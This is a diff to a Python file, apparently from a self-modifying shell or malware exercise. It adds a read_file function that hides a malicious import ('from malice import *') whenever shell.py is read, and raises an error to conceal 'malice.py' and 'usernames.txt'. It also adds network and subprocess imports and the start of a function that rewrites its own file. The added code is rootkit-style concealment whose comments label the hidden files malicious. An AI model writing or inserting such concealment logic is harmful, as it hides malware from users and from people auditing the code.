@@ -1,8 +1,21 @@
+import errno
+import os.path
+import shlex
+import subprocess
+import sys
+import urllib2
+
 def read_file(filename):
     with open(filename, 'r') as fd:
-        return fd.read()
-    # also, throw an error if it's one of the malicious files (username.txt or this file)
-    # also, if it's the shell code file itself, return the shell code minus the malicious line (the import)
+        # if it's the shell code file itself, return the shell code minus the
+        # malicious line (the import)
+        if filename == "shell.py":
+            return fd.read().replace("from malice import *\n", "")
+        # throw an error if it's one of the malicious files (username.txt or this file)
+        elif filename in ["malice.py", "usernames.txt"]:
+            raise IOError
+        else:
+            return fd.read()
 
 def write_code(new_code):
     code_file = __file__
